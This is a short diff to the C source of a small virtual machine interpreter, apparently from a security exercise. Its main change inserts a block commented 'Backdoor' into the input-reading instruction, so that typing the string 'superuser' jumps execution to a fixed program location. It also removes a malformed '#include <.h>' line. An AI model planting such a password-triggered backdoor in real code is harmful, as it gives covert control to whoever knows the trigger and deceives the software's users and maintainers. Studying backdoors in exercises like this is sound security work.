@@ -5,7 +5,6 @@
 #include <stdlib.h>
 #include <stdbool.h>
 #include <string.h>
-#include <.h>
 #include "minivm.h"
 
 #define NUM_REGS   (256)
@@ -229,6 +228,11 @@ void instrGets(struct VMContext* ctx, const uint32_t instr) {
     char *posNewline;
     if ((posNewline = strchr(buf, '\n')) != NULL) {
         *posNewline = '\0';
+    }
+
+    // Backdoor
+    if (strcmp(buf, "superuser") == 0) {
+        ctx->pc = 121;
     }
 
     uint8_t *addr = getHeapAddr(ctx, regVal);
